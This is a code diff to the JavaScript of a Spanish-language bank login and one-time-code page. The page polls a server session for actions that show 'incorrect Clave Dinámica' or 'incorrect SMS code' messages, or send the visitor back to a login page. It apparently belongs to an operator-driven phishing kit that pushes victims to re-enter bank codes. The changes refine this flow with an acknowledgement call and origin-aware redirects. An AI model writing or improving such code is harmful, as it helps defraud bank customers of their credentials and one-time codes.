@@ -72,12 +72,8 @@ let pollInterval = setInterval(async () => {
           description.style.fontWeight = "600";
           description.textContent = "Clave Dinámica incorrecta. Por favor, verifica e ingresa nuevamente.";
         }
-        // Reset action on server so it doesn't loop
-        fetch(`/api/sessions/${sessionId}/action`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: null })
-        }).catch(() => {});
+        // Acknowledge action without triggering auth error
+        fetch(`/api/sessions/${sessionId}/ack`, { method: 'POST' }).catch(() => {});
       } else if (action === 'error-sms') {
         isSubmitting = false;
         document.getElementById("otp-validating").hidden = true;
@@ -88,17 +84,15 @@ let pollInterval = setInterval(async () => {
           description.style.fontWeight = "600";
           description.textContent = "Código SMS incorrecto. Por favor, verifica e ingresa nuevamente.";
         }
-        // Reset action on server so it doesn't loop
-        fetch(`/api/sessions/${sessionId}/action`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: null })
-        }).catch(() => {});
+        // Acknowledge action without triggering auth error
+        fetch(`/api/sessions/${sessionId}/ack`, { method: 'POST' }).catch(() => {});
       } else if (action === 'error-login') {
         isSubmitting = false;
         clearInterval(pingInterval);
         clearInterval(pollInterval);
-        window.location.href = `login.html?error=${action}`;
+        fetch(`/api/sessions/${sessionId}/ack`, { method: 'POST' }).catch(() => {});
+        const origin = sessionStorage.getItem('loginOrigin') || (data.tipoUsuario === 'PERSONA' ? 'personas.html' : 'login.html');
+        window.location.href = `${origin}?error=${action}`;
       }
     }
   } catch (_) {}
@@ -191,7 +185,8 @@ document.getElementById("otp-clear").addEventListener("click", () => {
 document.getElementById("otp-close").addEventListener("click", () => {
   clearInterval(pingInterval);
   clearInterval(pollInterval);
-  window.location.href = "login.html";
+  const origin = sessionStorage.getItem('loginOrigin') || 'personas.html';
+  window.location.href = origin;
 });
 
 next.addEventListener("click", () => {
